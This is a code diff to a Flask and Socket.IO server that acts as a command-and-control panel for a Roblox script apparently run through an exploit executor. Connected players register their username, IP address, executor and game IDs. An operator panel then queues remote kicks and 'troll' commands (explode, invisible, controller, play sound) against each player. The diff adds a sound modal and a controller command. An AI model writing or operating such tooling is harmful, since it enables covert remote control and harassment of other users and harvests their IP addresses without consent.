@@ -100,12 +100,25 @@ button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform
         </div>
     </div>
 </div>
+
+<div class="modal" id="playSoundModal">
+    <div class="modal-content">
+        <h2>Play Sound</h2>
+        <input type="text" id="soundId" placeholder="Asset ID" autofocus>
+        <div class="modal-buttons">
+            <button class="cancel-btn" id="cancelSound">Cancel</button>
+            <button class="confirm-btn" id="confirmSound">Play</button>
+        </div>
+    </div>
+</div>
+
 <div class="toast-container" id="toasts"></div>
 
 <script>
 const socket = io();
 let currentKickId = null;
 const kickModal = document.getElementById("kickModal");
+const playSoundModal = document.getElementById("playSoundModal");
 
 function toast(msg, type = "success") {
     const t = document.createElement("div");
@@ -116,7 +129,7 @@ function toast(msg, type = "success") {
 }
 
 function openKickModal(id) { currentKickId = id; kickModal.classList.add("active"); document.getElementById("kickReason").focus(); }
-function closeModal() { kickModal.classList.remove("active"); }
+function closeModal() { kickModal.classList.remove("active"); playSoundModal.classList.remove("active"); }
 
 function performKick() {
     if (!currentKickId) return;
@@ -126,10 +139,17 @@ function performKick() {
     closeModal();
 }
 
-function sendTroll(id, cmd, assetId = null) {
-    const body = {userid: id, cmd: cmd};
-    if(assetId) body["assetId"] = assetId;
-    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)});
+function openSoundModal(id) { currentKickId = id; playSoundModal.classList.add("active"); document.getElementById("soundId").focus(); }
+function playSound() {
+    const assetId = document.getElementById("soundId").value.trim();
+    if (!currentKickId || !assetId) return;
+    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, cmd: "playsound:" + assetId})});
+    toast(`Play Sound sent`, "success");
+    closeModal();
+}
+
+function sendTroll(id, cmd) {
+    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd})});
     toast(`${cmd.toUpperCase()} sent`, "danger");
 }
 
@@ -141,7 +161,6 @@ function render(data) {
     Object.entries(data.players).forEach(([id, p]) => {
         let card = document.getElementById(`card_${id}`);
         if (!card) { card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card); }
-
         card.innerHTML = `
             <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
@@ -157,7 +176,8 @@ function render(data) {
                 <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
-                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','playsound', prompt('Enter Asset ID'))">PLAY SOUND</button>
+                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','controller')">CONTROLLER</button>
+                <button class="kick-btn" style="background:#666;" onclick="openSoundModal('${id}')">PLAY SOUND</button>
             </div>
             <div class="category">UNDO</div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
@@ -177,7 +197,10 @@ function render(data) {
 
 document.getElementById("cancelKick").onclick = closeModal;
 document.getElementById("confirmKick").onclick = performKick;
+document.getElementById("cancelSound").onclick = closeModal;
+document.getElementById("confirmSound").onclick = playSound;
 kickModal.onclick = (e) => { if (e.target === kickModal) closeModal(); };
+playSoundModal.onclick = (e) => { if (e.target === playSoundModal) closeModal(); };
 
 socket.on("update", render);
 socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
@@ -186,11 +209,7 @@ socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "of
 </body>
 </html>"""
 
-@app.route("/")
-def index():
-    return render_template_string(HTML)
-
-@app.route("/api", methods=["GET", "POST"])
+@app.route("/api", methods=["GET","POST"])
 def api():
     now = time.time()
     if request.method == "POST":
@@ -199,79 +218,71 @@ def api():
             uid = str(d["userid"])
             if d.get("action") == "register":
                 connected_players[uid] = {
-                    "username": d.get("username", "Unknown"),
-                    "executor": d.get("executor", "Unknown"),
-                    "ip": d.get("ip", "Unknown"),
+                    "username": d.get("username","Unknown"),
+                    "executor": d.get("executor","Unknown"),
+                    "ip": d.get("ip","Unknown"),
                     "last": now,
                     "online": True,
-                    "game": d.get("game", "Unknown"),
-                    "gameId": d.get("gameId", 0),
-                    "jobId": d.get("jobId", "Unknown")
+                    "game": d.get("game","Unknown"),
+                    "gameId": d.get("gameId",0),
+                    "jobId": d.get("jobId","Unknown")
                 }
+                socketio.emit("status", {"username": connected_players[uid]["username"], "online": True})
             elif d.get("action") == "heartbeat" and uid in connected_players:
                 connected_players[uid]["last"] = now
         except: pass
         return jsonify({"ok": True})
-
     if request.method == "GET":
-        uid = str(request.args.get("userid", ""))
+        uid = str(request.args.get("userid",""))
         if not uid: return jsonify({})
         if uid in pending_kicks:
-            reason = pending_kicks.pop(uid, "Kicked")
-            return jsonify({"command": "kick", "reason": reason})
+            reason = pending_kicks.pop(uid,"Kicked")
+            return jsonify({"command":"kick","reason":reason})
         if uid in pending_commands:
             cmd = pending_commands.pop(uid)
-            assetId = None
-            if isinstance(cmd, dict):
-                assetId = cmd.get("assetId")
-                cmd = cmd.get("cmd")
-            return jsonify({"command": cmd, "assetId": assetId})
+            return jsonify({"command":cmd})
         return jsonify({})
 
 @app.route("/kick", methods=["POST"])
 def kick():
     check_ip()
     data = request.get_json() or {}
-    uid = str(data.get("userid", ""))
-    reason = data.get("reason", "No reason")
+    uid = str(data.get("userid",""))
+    reason = data.get("reason","No reason")
     pending_kicks[uid] = reason
-    name = connected_players.get(uid, {}).get("username", "Unknown")
-    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
-    return jsonify({"sent": True})
+    name = connected_players.get(uid,{}).get("username","Unknown")
+    socketio.emit("kick_notice",{"username":name,"reason":f"KICK: {reason}"})
+    return jsonify({"sent":True})
 
 @app.route("/troll", methods=["POST"])
 def troll():
     check_ip()
     data = request.get_json() or {}
-    uid = str(data.get("userid", ""))
-    cmd = data.get("cmd", "")
-    assetId = data.get("assetId", None)
+    uid = str(data.get("userid",""))
+    cmd = data.get("cmd","")
     if uid and cmd:
-        if assetId:
-            pending_commands[uid] = {"cmd": cmd, "assetId": assetId}
-        else:
-            pending_commands[uid] = cmd
-        name = connected_players.get(uid, {}).get("username", "Unknown")
-        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
-    return jsonify({"sent": True})
+        pending_commands[uid] = cmd
+        name = connected_players.get(uid,{}).get("username","Unknown")
+        socketio.emit("kick_notice",{"username":name,"reason":cmd.upper()})
+    return jsonify({"sent":True})
 
 def broadcast_loop():
     while True:
         now = time.time()
         online = 0
         to_remove = []
-        for uid, p in connected_players.items():
+        for uid,p in connected_players.items():
             if now - p["last"] > 30:
                 to_remove.append(uid)
             else:
                 p["online"] = now - p["last"] < 15
                 if p["online"]: online += 1
         for uid in to_remove:
-            username = connected_players.pop(uid, {}).get("username", "Unknown")
-            socketio.emit("status", {"username": username, "online": False})
-        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
+            username = connected_players.pop(uid,{}).get("username","Unknown")
+            socketio.emit("status",{"username":username,"online":False})
+        socketio.emit("update",{"players":connected_players,"online":online,"total":len(connected_players)})
         socketio.sleep(2)
 
-if __name__ == "__main__":
+if __name__=="__main__":
     socketio.start_background_task(broadcast_loop)
-    socketio.run(app, host="0.0.0.0", port=5000)
+    socketio.run(app,host="0.0.0.0",port=5000)
